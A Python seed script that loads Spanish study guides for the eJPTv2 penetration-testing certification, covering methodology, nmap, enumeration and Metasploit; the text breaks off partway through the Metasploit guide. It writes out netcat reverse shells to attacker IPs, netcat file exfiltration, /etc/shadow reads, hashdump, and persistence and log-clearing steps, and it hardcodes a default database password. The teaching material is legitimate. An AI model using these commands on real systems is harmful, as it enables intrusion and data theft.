"""
seed_ejptv2_teoria.py
═══════════════════════════════════════════════════════════════════════════════
Inserta la materia "eJPTv2 - Junior Penetration Tester" con 7 guías completas
de teoría cubre el curriculum completo de la certificación eJPTv2:

  1. Metodología Pentesting y Preparación eJPTv2
  2. Redes para Pentesters: TCP/IP, Nmap y Wireshark
  3. Enumeración y Reconocimiento: Nmap, Gobuster y Netcat
  4. Metasploit Framework: Explotación de Sistemas
  5. Ataques a Aplicaciones Web: SQLi, XSS y más
  6. Post-Explotación: Meterpreter, Pivoting y Persistencia
  7. Informe de Pentesting Profesional y Preparación al Examen

Uso:
    cd /path/to/backend
    source venv/bin/activate
    python scripts/seed_ejptv2_teoria.py

═══════════════════════════════════════════════════════════════════════════════
"""

import os, sys
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import load_dotenv
load_dotenv()

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://tech4u_admin:tech4u_admin@localhost:5432/tech4u")
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


# ─── Post 1: Metodología Pentesting ───────────────────────────────────────────

METODOLOGIA_PENTESTING_CONTENT = """# Metodología Pentesting y Preparación eJPTv2

## Introducción a eJPT

El **eJPT (eLearnSecurity Junior Penetration Tester)** es la certificación ideal para comenzar en pentesting profesional. A diferencia del CEH (Certified Ethical Hacker) que es más teórico, eJPT es 100% práctico: resuelves 4 máquinas vulnerables en 4 horas sin poder usar herramientas automatizadas avanzadas. Es como decir "lo que aprendes, lo usas inmediatamente".

### eJPT vs CEH: ¿Cuál elegir?

| Característica | eJPT | CEH |
|---|---|---|
| Experiencia requerida | Básica | Intermedia |
| Tiempo examen | 4 horas | 3 horas |
| Máquinas a comprometer | 4 (labs) | MCQ (múltiple choice) |
| Enfoque | Práctico 100% | 70% teórico |
| Herramientas permitidas | Herramientas básicas | Restringidas |
| Costo | ~$200 | ~$1000 |
| Validez industria | Muy buena para junior | Excelente internacionalmente |
| Prerequisito | Ninguno | Experiencia requerida |

**Recomendación para Técnico de FP Informática:** Empieza con eJPT. Es tu puerta de entrada a la industria y muchas empresas españolas lo valoran para roles junior.

---

## Las 5 Fases de Penetración

Todo pentest profesional sigue estas 5 fases. El examen eJPT es una aplicación práctica de estas fases.

### Fase 1: Reconocimiento (Reconnaissance)

**Objetivo:** Recopilar información sobre el objetivo SIN atacar directamente.

**Técnicas pasivas:**
- Búsqueda en Google dorking: `site:objetivo.com filetype:pdf`
- WHOIS lookups: `whois target.com`
- DNS enumeration: `nslookup` / `dig`
- Búsqueda en The Harvester para recopilar emails
- Linkedin, redes sociales para encontrar empleados

**Por qué importa en eJPT:**
En los labs de eJPT, esta fase es crítica. Los objetos target a menudo tienen subdomios ocultos, servicios internos y usuarios en los comentarios HTML.

**Ejemplo práctico:**
```bash
# Recopilar información de dominio
whois hackthebox.eu
nslookup target.com
dig target.com ANY

# Buscar información de empleados (OSINT)
theHarvester -d target.com -b google
```

---

### Fase 2: Escaneo (Scanning)

**Objetivo:** Mapear servicios, puertos abiertos y versiones usando herramientas activas.

**Herramientas clave:**
- **Nmap:** Port scanning, OS detection, service enumeration
- **Wireshark:** Análisis de tráfico de red
- **Nikto/Nessus:** Vulnerability scanning

**Estrategia de Nmap para eJPT:**

```bash
# Paso 1: Quick host discovery (¿qué está vivo?)
nmap -sn 192.168.1.0/24

# Paso 2: Port scan rápido
nmap -p- --open -T4 192.168.1.100

# Paso 3: Service detection con versiones (MÁS IMPORTANTE)
nmap -sV -sC -p 22,80,443,3306,5432 192.168.1.100

# Paso 4: OS detection
nmap -O 192.168.1.100

# Combinado (completo):
nmap -sV -sC -O -A -p- 192.168.1.100
```

**En eJPT:** Algunos servicios dan pistas en sus banners. Por ejemplo:
- FTP de vsftpd 2.3.4 = vulnerable a backdoor (CVE-2011-2523)
- Apache 1.3.26 = vulnerable a several RCE exploits
- MySQL sin autenticación = acceso directo a bases de datos

---

### Fase 3: Enumeración (Enumeration)

**Objetivo:** Extraer información detallada de servicios descubiertos.

**Por servicio:**

**SMB (Puerto 445/139):**
```bash
# Listar shares sin autenticación
smbclient -L //192.168.1.100 -N

# Montar share
mount -t cifs //192.168.1.100/share /mnt/smb

# Enumerar usuarios y información del sistema
enum4linux 192.168.1.100
```

**FTP (Puerto 21):**
```bash
# Conectar y listar
ftp 192.168.1.100
# Buscar archivos interesantes (credenciales, configuración)
```

**HTTP (Puertos 80/443):**
```bash
# Fuzzing de directorios
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Análisis detallado con Burp Suite
# - Interceptar tráfico
# - Analizar respuestas
# - Buscar directorios ocultos
```

**Bases de datos (3306/5432):**
```bash
# MySQL remoto
mysql -u root -h 192.168.1.100

# PostgreSQL remoto
psql -U postgres -h 192.168.1.100
```

---

### Fase 4: Explotación (Exploitation)

**Objetivo:** Ganar acceso usando vulnerabilidades encontradas.

**Métodos comunes en eJPT:**

1. **SQL Injection:**
   - Acceder a aplicaciones web sin credenciales
   - Extraer datos de bases de datos
   - En eJPT: Common en login forms

2. **Weak Credentials:**
   - SSH/FTP/HTTP con usuario:pass débiles
   - Credenciales por defecto (admin/admin, root/root)
   - Credenciales en comentarios HTML

3. **Misconfigurations:**
   - Servicios exponiendo datos sin autenticación
   - Archivos de configuración accesibles
   - Directorios con permisos abiertos

4. **Known Vulnerabilities:**
   - Usar Metasploit para exploits disponibles
   - EternalBlue (Windows), vsftpd backdoor (Linux)

**Flujo típico en eJPT:**
```
1. Encontrar puerto abierto (Puerto 22/SSH)
2. Enumerar versión de SSH
3. Si vulnerable → usar exploit
4. Si no → obtener credenciales de otra forma
5. Conectar con SSH
6. Ejecutar comandos como usuario comprometido
```

---

### Fase 5: Post-Explotación (Post-Exploitation)

**Objetivo:** Mantener acceso, escalar privilegios, extraer datos y reportar.

**Tareas post-explotación en eJPT:**

1. **Gather Information (Recopilación de datos):**
   ```bash
   # En shell de Metasploit (Meterpreter)
   sysinfo
   getuid
   whoami
   ipconfig
   ```

2. **Privilege Escalation (Escalar a root):**
   ```bash
   # Intentar escalada sudo
   sudo -l

   # Buscar binarios SUID
   find / -perm -4000 2>/dev/null

   # Kernel exploits
   # Ejemplo: CVE-2016-5195 (Dirty COW)
   ```

3. **Extract Credentials:**
   ```bash
   # En Windows (con Meterpreter)
   hashdump

   # En Linux
   cat /etc/shadow
   cat /etc/passwd
   ```

4. **Persistence (Persistencia para mantener acceso):**
   - Crear backdoor user
   - Añadir clave SSH
   - Scheduled tasks

5. **Cover Tracks (Borrar evidencia):**
   - Limpiar logs
   - Remover archivos maliciosos
   - En eJPT no es necesario pero en reales sí

---

## Estructura del Examen eJPT

### Formato
- **Tipo:** 4 máquinas virtuales a comprometer
- **Tiempo:** 4 horas contínuas
- **Objetivos:** Cada máquina tiene un objetivo específico (ganar acceso, escalar, etc.)
- **Herramientas:** Nmap, Netcat, Metasploit, curl, bash scripting
- **RESTRICCIÓN:** No puedes usar herramientas automatizadas type Nexpose, Qualys

### Estrategia de Tiempo en eJPT

```
Tiempo total: 4 horas = 240 minutos

Minutos 0-30: RECONOCIMIENTO Y ESCANEO
 - Nmap completo de todos los hosts
 - Identificar servicios abiertos
 - Listar vulnerabilidades obvias

Minutos 30-120: EXPLOTACIÓN DE MÁQUINA 1
 - Enumeración detallada
 - Identificar vector de ataque
 - Ganar acceso
 - Escalar si es necesario

Minutos 120-180: MÁQUINAS 2 y 3
 - Aplicar lo aprendido
 - Reutilizar exploits
 - Faster enumeration

Minutos 180-240: MÁQUINA 4 Y REPORTE
 - Última máquina
 - Recopilación de evidencia
 - Screenshot de flags
 - Preparar informe
```

### Consejos Clave para Aprobado
1. **Lee los objetivos cuidadosamente** - A menudo hay pistas en la descripción
2. **Toma screenshots** - Necesitas probar lo que encontraste
3. **Apunta las credenciales encontradas** - Las reutilizarás
4. **Pivoting es común** - Después de comprometer una máquina, úsala para atacar otras
5. **No te atasques** - Si no avanzas en 30min, salta a otra máquina
6. **Automatiza donde puedas** - Scripts bash para acelerar enumeración

---

## Herramientas Esenciales para eJPT

| Herramienta | Uso | Comando |
|---|---|---|
| **Nmap** | Port/Service scanning | `nmap -sV -sC -p- 192.168.1.100` |
| **Netcat** | Reverse shells, banner grabbing | `nc -e /bin/bash 10.10.10.10 4444` |
| **Metasploit** | Exploitation framework | `msfconsole`, `use exploit/...` |
| **Gobuster** | Web directory fuzzing | `gobuster dir -u http://target -w wordlist` |
| **Wireshark** | Packet capture and analysis | GUI, filter: `tcp.port==80` |
| **Burp Suite Community** | Web app testing | Proxy, Repeater, Intruder |
| **John** | Password cracking | `john --wordlist=rockyou.txt hashes.txt` |
| **Hashcat** | GPU password cracking | `hashcat -m 1000 hashes.txt wordlist.txt` |
| **curl/wget** | HTTP requests | `curl -u admin:pass http://target` |
| **ssh** | Remote shell | `ssh -i key.pem user@target` |

---

## Roadmap de Estudio para eJPTv2

1. **Semana 1:** Redes (TCP/IP, Nmap basics)
2. **Semana 2:** Enumeración (SMB, FTP, HTTP, Databases)
3. **Semana 3:** Explotación (SQL Injection, Weak creds, Metasploit)
4. **Semana 4:** Post-explotación (Privilege escalation, persistence)
5. **Semana 5:** Labs prácticos (TryHackMe/HackTheBox)
6. **Semana 6:** Simulacro del examen completo

---

## Recursos Oficiales

- **Plataforma eJPT:** https://elearnsecurity.com/product/ejpt/
- **Labs en plataforma:** Acceso a máquinas vulnerables de práctica
- **Documentación oficial:** eLearnSecurity proporciona materiales de estudio
- **Discord eJPT:** Comunidad de estudiantes (soporte de peers)

**Nota:** El examen es online proctored. Necesitarás webcam, micrófono y conexión estable.

---

## Checklist Pre-Examen

- [ ] Actualizar Kali Linux: `apt update && apt upgrade`
- [ ] Verificar conectividad a VPN eJPT
- [ ] Testear herramientas básicas (nmap, netcat, ssh)
- [ ] Tener wordlists disponibles (rockyou.txt, dirbuster)
- [ ] Preparar editor de texto para notas
- [ ] Configurar screenshot tool
- [ ] Descanso de 8 horas antes
- [ ] Internet estable (no WiFi, preferir Ethernet)
- [ ] Cámara web limpia y visible
- [ ] Entorno silencioso y sin distracciones
"""

# ─── Post 2: Redes Fundamentales ──────────────────────────────────────────────

REDES_FUNDAMENTALES_CONTENT = """# Redes para Pentesters: TCP/IP, Nmap y Wireshark

## Modelo OSI vs TCP/IP para Pentesters

Como pentester, necesitas entender en qué capa opera cada ataque.

```
MODELO OSI (7 CAPAS)                TCP/IP (4 CAPAS)
┌─────────────────────┐            ┌──────────────────┐
│ 7. Aplicación       │            │ Aplicación       │
│ 6. Presentación     │     HTTP, FTP, SSH, SMTP
│ 5. Sesión           │            │
├─────────────────────┤            ├──────────────────┤
│ 4. Transporte       │            │ Transporte       │
│ (TCP/UDP)           │    TCP, UDP
├─────────────────────┤            ├──────────────────┤
│ 3. Red              │            │ Internet         │
│ (IP)                │    IP, ICMP, ARP
├─────────────────────┤            ├──────────────────┤
│ 2. Enlace           │            │ Enlace           │
│ (Ethernet)          │    Ethernet, PPP
│ 1. Física           │
└─────────────────────┘            └──────────────────┘
```

### Por qué importa en pentesting:

- **Capa 2 (Enlace):** ARP spoofing, VLAN hopping
- **Capa 3 (Red):** IP spoofing, ICMP tunneling
- **Capa 4 (Transporte):** TCP/UDP port scanning, SYN flood
- **Capa 7 (Aplicación):** SQL injection, XSS, credential theft

---

## IP Addressing for Pentesters

### Clases de IP (Privadas)

```
CLASE A: 10.0.0.0 - 10.255.255.255         (Máscara /8)
 → Redes corporativas grandes
 → Ej: 10.10.10.100

CLASE B: 172.16.0.0 - 172.31.255.255      (Máscara /12)
 → Redes medianas
 → Ej: 172.16.0.100

CLASE C: 192.168.0.0 - 192.168.255.255    (Máscara /16)
 → Redes pequeñas y hogares
 → Ej: 192.168.1.100
```

### Cálculo rápido de subnets (para enumeración)

```bash
# ¿Cuántos hosts en /24?
2^(32-24) - 2 = 254 hosts usables

# ¿Cuántos en /25?
2^(32-25) - 2 = 126 hosts usables

# ¿Cuántos en /22?
2^(32-22) - 2 = 1022 hosts usables
```

**En pentesting:** Si encuentras red 10.0.0.0/8, sabes que hay potencialmente cientos de miles de hosts internos.

---

## Protocolos Clave para Pentesting

### TCP vs UDP

```
TCP (Transmission Control Protocol)
├─ Connection-oriented (handshake 3-way)
├─ Reliable (retransmisión)
├─ Slow (overhead)
└─ Puertos: 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL)

UDP (User Datagram Protocol)
├─ Connectionless (sin handshake)
├─ Unreliable (sin garantía)
├─ Fast (low overhead)
└─ Puertos: 53(DNS), 67(DHCP), 123(NTP), 161(SNMP)
```

### ICMP (Internet Control Message Protocol)

```bash
# ICMP es usado para ping (diagnóstico)
ping -c 4 8.8.8.8

# En pentesting: algunos firewalls bloquean ICMP
# pero dejan pasar tráfico en puertos específicos

# ICMP tipos importantes:
# Tipo 8  = Echo Request (Ping)
# Tipo 0  = Echo Reply (Pong)
# Tipo 3  = Destination Unreachable
# Tipo 11 = Time Exceeded
```

### ARP (Address Resolution Protocol)

```bash
# Ver tabla ARP
arp -a

# En ataque ARP spoofing (MITM)
# Atacante finge ser la puerta de enlace
# Víctima envía tráfico al atacante
```

---

## NMAP: La Biblia del Pentester

### Sintaxis Básica

```bash
nmap [OPCIONES] [TARGET]
```

### Host Discovery (Descubrir hosts vivos)

```bash
# Ping simple
nmap -sn 192.168.1.0/24

# ARP scan (más rápido en redes locales)
nmap -sn -PR 192.168.1.0/24

# TCP SYN ping (traspasar algunos firewalls)
nmap -sn -PS22,80,443 192.168.1.0/24

# ICMP echo ping
nmap -sn -PE 192.168.1.0/24
```

### Port Scanning (Los 3 tipos principales)

#### 1. TCP Connect Scan (-sT)
```bash
# Realiza full TCP handshake
# VENTAJA: Funciona sin privilegios root
# DESVENTAJA: Más lento, más ruidoso (dejar logs)
nmap -sT 192.168.1.100
```

#### 2. TCP SYN Scan (-sS, por defecto)
```bash
# Half-open scan: SYN -> SYN/ACK -> RST
# VENTAJA: Rápido, sigiloso, no completa conexión
# DESVENTAJA: Necesita root
nmap -sS 192.168.1.100
```

#### 3. UDP Scan (-sU)
```bash
# Escanea puertos UDP
# VENTAJA: Descubre servicios UDP (DNS, SNMP, NTP)
# DESVENTAJA: MUY lento
nmap -sU -p 53,67,123,161 192.168.1.100
```

### Service Detection (-sV)

```bash
# Detecta versión de servicio
nmap -sV 192.168.1.100

# Output con versiones:
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open   http    Apache httpd 2.4.6
3306/tcp open  mysql   MySQL 5.7.32
```

**En pentesting:** Las versiones viejas = vulnerables.
- OpenSSH 7.0-7.4 = vulnerabilidades conocidas
- Apache 2.4.0-2.4.9 = vulnerabilidades de mod_ssl

### OS Detection (-O)

```bash
nmap -O 192.168.1.100

# Output:
# Running: Microsoft Windows 7|8
# OS CPE: cpe:/o:microsoft:windows:7
# OS details: Microsoft Windows 7 SP1
```

**En pentesting:** Windows = diferente set de exploits que Linux.

### Script Scanning (-sC)

```bash
# Ejecuta scripts NSE (Nmap Scripting Engine) por defecto
nmap -sC 192.168.1.100

# Algunos scripts útiles:
# - smb-enum-shares.nse (SMB enumeration)
# - http-enum.nse (Web directory enumeration)
# - mysql-info.nse (MySQL version)
```

### Aggressive Scan (-A)

```bash
# Combina -sV, -O, -sC y traceroute
nmap -A 192.168.1.100
```

### Ejemplos de Nmap Realistas

```bash
# RÁPIDO: Identificar lo que está abierto
nmap -p- --open -T4 192.168.1.0/24

# DETALLADO: Una máquina específica
nmap -sV -sC -O -A 192.168.1.100

# SIGILOSO: Evasión de IDS
nmap -sS -D RND:10 -f --mtu 24 192.168.1.100

# SMB ENUMERATION
nmap --script smb-enum-shares -p 445 192.168.1.100

# WEB ENUMERATION
nmap -sV -p 80,443 --script http-enum 192.168.1.100
```

---

## WIRESHARK: Analizador de Paquetes

### Instalación y Básicos

```bash
# En Kali Linux
apt install wireshark

# Ejecutar
wireshark &

# O por terminal
tshark -i eth0
```

### Captura de Paquetes Útiles para Pentesting

```bash
# Capturar tráfico HTTP no encriptado
tshark -i eth0 -f "tcp port 80" -Y "http"

# Capturar tráfico FTP (incluye credenciales)
tshark -i eth0 -f "tcp port 21" -Y "ftp"

# Capturar todo el tráfico de una IP
tshark -i eth0 -f "host 192.168.1.100"

# Capturar contraseñas en tráfico no encriptado
tshark -i eth0 -Y "http.request or tcp.flags.syn" | grep -i pass
```

### Filtros Avanzados en Wireshark

```
# Tráfico HTTP
http

# Tráfico no encriptado (sin HTTPS)
!ssl && !tls

# De una IP específica
ip.src == 192.168.1.100 || ip.dst == 192.168.1.100

# Puertos específicos
tcp.port == 22 or tcp.port == 23

# Follow TCP stream (ver conversación completa)
# Click derecho en paquete → Follow → TCP Stream
```

**En pentesting:** Wireshark es perfecto para:
- Capturar credenciales FTP/Telnet no encriptado
- Analizar tráfico entre máquinas comprometidas
- Detectar tráfico malicioso o backdoors

---

## Network Pivoting Básico

Después de comprometer una máquina, úsala como puente para atacar la red interna.

```bash
# En máquina comprometida, escanear red interna
ifconfig  # Encontrar interfaces y redes

# Usar nmap desde máquina comprometida
nmap -sV 10.0.0.0/24

# Crear SSH tunnel para pasar tráfico
# Desde atacante:
ssh -L 8080:10.0.0.50:80 user@compromised_machine
# Ahora http://localhost:8080 te lleva a 10.0.0.50:80
```

---

## Tabla de Puertos Comunes

| Puerto | Protocolo | Servicio | ¿Vulnerable? |
|--------|-----------|----------|---|
| 21 | FTP | File Transfer | Sí (credenciales débiles) |
| 22 | SSH | Secure Shell | A veces (outdated versions) |
| 23 | Telnet | Remote Login | MÁS PELIGROSO (sin encriptación) |
| 25 | SMTP | Email | Sí (relay abierto, enumeration) |
| 53 | DNS | Domain Name System | Sí (zone transfer, poisoning) |
| 80 | HTTP | Web | Sí (inyecciones, misconfig) |
| 110 | POP3 | Email | Weak credentials |
| 139 | NetBIOS | SMB | Sí (enumeration, exploits) |
| 143 | IMAP | Email | Weak credentials |
| 445 | SMB | Windows Share | Sí (EternalBlue, ransomware) |
| 3306 | MySQL | Database | Sí (no auth, weak creds) |
| 3389 | RDP | Remote Desktop | Brute force, BlueKeep |
| 5432 | PostgreSQL | Database | No auth, weak creds |
| 5900 | VNC | Remote Desktop | Weak credentials |
| 8080 | HTTP | Web (alternate) | Sí (web vulns) |

---

## Checklist de Enumeración de Red

- [ ] Host discovery (nmap -sn)
- [ ] Quick port scan (nmap -p- --open)
- [ ] Service detection (nmap -sV)
- [ ] OS detection (nmap -O)
- [ ] Script scans (nmap -sC)
- [ ] Wireshark capture de tráfico interesante
- [ ] Banner grabbing de servicios
- [ ] Documentar todos los hosts y puertos encontrados
"""

# ─── Post 3: Enumeración y Reconocimiento ──────────────────────────────────────

ENUMERACION_RECONOCIMIENTO_CONTENT = """# Enumeración y Reconocimiento: Nmap, Gobuster y Netcat

## Tipos de Reconocimiento: Pasivo vs Activo

```
RECONOCIMIENTO PASIVO (OSINT)
├─ Sin contacto directo con target
├─ No genera logs
├─ Métodos: Google, WHOIS, DNS, LinkedIn
└─ Riesgo de detección: Cero

RECONOCIMIENTO ACTIVO
├─ Contacto directo (escaneo)
├─ Genera logs de IDS/Firewall
├─ Métodos: Nmap, Ping, DNS queries
└─ Riesgo de detección: Alto
```

---

## OSINT: Inteligencia de Código Abierto

### WHOIS - Información de Dominio

```bash
# Consultar propietario del dominio
whois target.com

# Output útil:
# - Registrador (Name Server)
# - Contacto del propietario
# - Fecha de registro
# - Fecha de expiración
# - Rango de IPs asociadas
```

### DNS Enumeration - Encontrar Subdominos

```bash
# Listar registros DNS
nslookup target.com
dig target.com ANY

# Buscar subdominos (zone transfer si es posible)
dig axfr target.com @ns1.target.com

# En eJPT: Muchas veces hay subdominos ocultos
# admin.target.com, internal.target.com, dev.target.com
```

### The Harvester - Recopilación de Emails

```bash
# Encontrar emails asociados a dominio
theHarvester -d target.com -b google

# -b = buscador (google, bing, linkedin, yahoo)
# Output: Emails, hosts, IPs asociadas

# Útil para: spear phishing, social engineering
```

---

## Port Enumeration - Estrategia Profesional

### Paso 1: Quick Scan (90 segundos)

```bash
# Los 1000 puertos más comunes
nmap -sC -sV -O 192.168.1.100

# En eJPT: Esto suele ser suficiente
# Descubre servicios principales
```

### Paso 2: Full Port Scan (si es necesario)

```bash
# Todos los 65535 puertos (tarda ~10 minutos)
nmap -p- --open 192.168.1.100

# Si encuentras puertos raros, investigar
# Puerto 8080 = Apache alternativo
# Puerto 9000 = Posible web app
```

### Paso 3: Service & Version Detection

```bash
# Una vez identificados los puertos, obtener versiones
nmap -sV -p 22,80,443,3306 192.168.1.100

# Verificar en searchsploit si versión es vulnerable
searchsploit Apache 2.4.6
searchsploit MySQL 5.7
```

---

## Netcat: La Navaja Suiza del Hacker

### Banner Grabbing (Obtener información de servicio)

```bash
# Conectar a un servicio y ver su banner
nc -v 192.168.1.100 21
# Posible output:
# 220 (vsFTPd 2.3.4)
# ^ Versión vulnerable al backdoor de 2011

nc -v 192.168.1.100 22
# SSH-2.0-OpenSSH_7.4

nc -v 192.168.1.100 25
# 220 mail.target.com ESMTP
```

### Reverse Shell - Obteniendo acceso

```bash
# En máquina atacante (Kali), escuchar
nc -lvnp 4444

# En máquina víctima (objetivo), conectar de vuelta
nc -e /bin/bash 192.168.1.50 4444

# Ahora el atacante tiene shell interactivo de la víctima
```

**En eJPT:** Si logras RCE (Remote Code Execution), netcat es la forma más directa de obtener una shell.

### File Transfer con Netcat

```bash
# Enviar archivo DESDE máquina comprometida
# En máquina comprometida:
nc 192.168.1.50 5555 < archivo_importante.txt

# En máquina atacante:
nc -lvnp 5555 > archivo_importante.txt

# Útil para: extraer credenciales, configuración, datos
```

---

## SMB Enumeration (Windows Shares)

### Listar Shares sin Credenciales

```bash
# Enumerar shares abiertos
smbclient -L //192.168.1.100 -N

# Output:
# Sharename        Type      Comment
# ---------        ----      -------
# ADMIN$           Disk      Remote Admin
# C$               Disk      Default Share
# Documents        Disk
# Backup           Disk

# -N = sin contraseña (null session)
```

### Conectar a un Share

```bash
# Montar share en local
smbclient //192.168.1.100/Documents -N

# Comandos útiles dentro:
# ls                  = listar archivos
# cd dir              = cambiar directorio
# get archivo.txt     = descargar
# put archivo.txt     = subir

# En eJPT: A menudo hay credenciales en archivos de texto
# .txt, .doc, .xlsx, .config files
```

### Enum4linux - Enumeration Automática

```bash
# Scan completo de SMB
enum4linux 192.168.1.100

# Obtiene:
# - Shares disponibles
# - Usuarios del sistema
# - Grupos
# - Políticas de contraseña
# - Información del dominio

# Útil para elaborar lista de usuarios para ataques de fuerza bruta
```

---

## FTP Enumeration

```bash
# Conectar a FTP
ftp 192.168.1.100

# Comandos útiles:
# ls              = listar archivos
# get archivo     = descargar
# dir -aL         = listar ocultos
# quote SYST      = obtener información del sistema

# Si permite login anónimo:
# usuario: anonymous
# contraseña: anything@email.com

# En eJPT: FTP con anonymous access es común
# Buscar credenciales, configuración, backups
```

---

## SSH Enumeration

```bash
# Banner grabbing
nc -v 192.168.1.100 22

# Versión de SSH révela información
# OpenSSH 7.4 = sistema vulnerable a ataques específicos

# Si credenciales conocidas:
ssh user@192.168.1.100

# Si clave privada disponible:
ssh -i private.key user@192.168.1.100

# Obtener información del sistema:
uname -a
id
sudo -l
```

---

## HTTP/HTTPS Enumeration (Web)

### Gobuster - Fuzzing de Directorios

```bash
# Búsqueda de directorios
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Output:
# /admin           (Status: 200)
# /upload          (Status: 200)
# /backup          (Status: 200)
# /api             (Status: 200)

# En eJPT: Encontrar /admin es mitad del trabajo
```

### FFUF - Alternativa a Gobuster (más rápido)

```bash
# Web directory fuzzing
ffuf -u http://192.168.1.100/FUZZ -w wordlist.txt

# Extensiones específicas
ffuf -u http://192.168.1.100/FUZZ.php -w wordlist.txt

# Subdominio fuzzing
ffuf -H "Host: FUZZ.target.com" -u http://192.168.1.100 -w subdomains.txt
```

### Nikto - Vulnerability Scanner Web

```bash
# Scan completo de vulnerabilidades web
nikto -h http://192.168.1.100

# Output:
# Outdated Apache version
# Backup files found (.bak, .old)
# Misconfigurations
# Plugins vulnerables

# En eJPT: Nikto da pistas sobre vulnerabilidades potenciales
```

### Curl/Wget - Requests Manuales

```bash
# Obtener cabeceras HTTP
curl -v http://192.168.1.100

# Buscar información en respuestas:
# - Server version
# - X-Powered-By (tecnología)
# - Set-Cookie (sesiones)

# Con autenticación
curl -u admin:admin http://192.168.1.100/admin

# POST request
curl -X POST -d "user=admin&pass=pass" http://192.168.1.100/login
```

---

## Databases Enumeration

### MySQL - Acceso Directo

```bash
# Conectar remoto (si no requiere autenticación)
mysql -u root -h 192.168.1.100

# Comandos útiles:
# SHOW DATABASES;        = listar bases de datos
# USE database_name;     = usar base de datos
# SHOW TABLES;           = listar tablas
# SELECT * FROM users;   = extraer datos

# En eJPT: A menudo credenciales de admin en tabla 'users'
```

### PostgreSQL

```bash
# Conectar remoto
psql -U postgres -h 192.168.1.100

# Comandos útiles:
# \l                  = listar databases
# \dt                 = listar tablas
# SELECT * FROM users; = consultar datos
```

### Scaneo rápido de BD

```bash
# Nmap script para MySQL
nmap --script mysql-info -p 3306 192.168.1.100

# Nmap script para PostgreSQL
nmap --script postgres-info -p 5432 192.168.1.100
```

---

## Vulnerability Scanning con Nessus (Alternativa: OpenVAS)

```bash
# Nessus es el más profesional (de pago)
# OpenVAS es la alternativa open-source

# Flujo típico:
# 1. Nueva exploración
# 2. Objetivo: 192.168.1.100
# 3. Template: Basic Network Scan
# 4. Ejecutar
# 5. Analizar resultados por severidad
```

**En eJPT:** No puedes usar Nessus en el examen. Pero usarlo en práctica acelera identificación de vulnerabilidades.

---

## Checklist de Enumeración Completa

- [ ] Nmap: Host discovery
- [ ] Nmap: Port scan completo
- [ ] Nmap: Service detection (-sV)
- [ ] Nmap: OS detection (-O)
- [ ] Banner grabbing de cada servicio (netcat)
- [ ] SMB enumeration (si puerto 445 abierto)
- [ ] FTP enumeration (si puerto 21 abierto)
- [ ] Web directory fuzzing (si puerto 80/443 abierto)
- [ ] Nikto scan de web app
- [ ] Database connection (si puerto 3306/5432 abierto)
- [ ] Documentar TODO lo encontrado
"""

# ─── Post 4: Metasploit Framework ─────────────────────────────────────────────

METASPLOIT_EXPLOTACION_CONTENT = """# Metasploit Framework: Explotación de Sistemas

## Arquitectura de Metasploit

```
METASPLOIT ARCHITECTURE
┌────────────────────────────────────────────┐
│          MSFCONSOLE (Interfaz)            │
├────────────────────────────────────────────┤
│          MÓDULOS DE EXPLOIT                │
├─────────────┬──────────────┬──────────────┤
│  Exploit    │   Payload    │  Encoder     │
│  (cómo)     │   (qué)      │  (ocultar)   │
└─────────────┴──────────────┴──────────────┘
```

### Componentes Principales

1. **Exploit:** El código que explota una vulnerabilidad
   - Ejemplo: EternalBlue (MS17-010) para Windows
   - Busca: `search ms17-010`

2. **Payload:** Lo que se ejecuta después del exploit
   - Staged: `windows/meterpreter/reverse_tcp` (pequeño, cargas más)
   - Stageless: `windows/meterpreter_reverse_tcp` (grande, todo en uno)

3. **Encoder:** Ofusca el payload para evasión de antivirus
   - Ejemplo: `shikata_ga_nai` (polymorphic encoder)

4. **Handler:** Escucha la conexión reversa del target
   - Automático en msfconsole con `exploit -j`

---

## Iniciando Metasploit

### Arrancar msfconsole

```bash
msfconsole

# Output:
# [*] Metasploit tip: Writing loot files...
# [*] Metasploit tip: Creating a new database connection...
# msf >
```

### Actualizar exploits (importante)

```bash
# Dentro de msfconsole
db_status  # Verificar base de datos

# Si no conecta:
exit
sudo msfdb init
msfconsole

# Dentro: actualizar
db_update
```

---

## Workflow Básico de Explotación

### Paso 1: Búsqueda de Exploit

```bash
# En msfconsole, buscar exploit
search ms17-010

# Output:
# Rank    Name
# ----    ----
# great   exploit/windows/smb/ms17_010_eternalblue

# Buscar por palabra clave
search vsftpd
search ssh_auth
search tomcat
```

### Paso 2: Seleccionar Exploit

```bash
# Usar un exploit específico
use exploit/windows/smb/ms17_010_eternalblue

# Verificar opciones requeridas
options

# Output:
# Module options (exploit/windows/smb/ms17_010_eternalblue):
#
# Name          Current Setting  Required  Description
# ----          ----------------  --------  -----------
# RHOST                            yes       The target host(s)
# LHOST                            yes       The local host
# LPORT         4444              yes       The local port
# PAYLOAD                          yes       Payload to use
```

### Paso 3: Configurar Opciones

```bash
# Establecer dirección del target
set RHOST 192.168.1.100

# Establecer dirección local (tu Kali)
set LHOST 192.168.1.50

# Puerto local (generalmente 4444)
set LPORT 4444

# Seleccionar payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Ver opciones nuevamente
options
```

### Paso 4: Ejecutar Exploit

```bash
# Ejecutar con sesión interactiva
exploit

# O en background (para manejar múltiples sesiones)
exploit -j

# Si todo va bien:
# [*] Payload handler started as job 1
# [+] Meterpreter session opened (IP address)
```

---

## Payloads en Profundidad

### Meterpreter - El Poder Total

Meterpreter es una shell avanzada dentro de Metasploit con comandos integrados:

```bash
# Una vez en sesión Meterpreter:
meterpreter > help

# Comandos principales:
sysinfo          # Información del sistema
getuid           # Mostrar usuario actual
whoami           # Nombre del usuario
getpid           # ID del proceso
ps               # Procesos activos
kill PID         # Matar proceso
getsystem        # Intentar escalada a SYSTEM
hashdump         # Extraer hashes NTLM de Windows
```

### Reverse Shell

```bash
# Reverse shell TCP (común)
windows/meterpreter/reverse_tcp

# Configuración:
set LHOST 192.168.1.50  # Tu IP
set LPORT 4444           # Tu puerto

# Reverse shell UDP
windows/meterpreter/reverse_udp

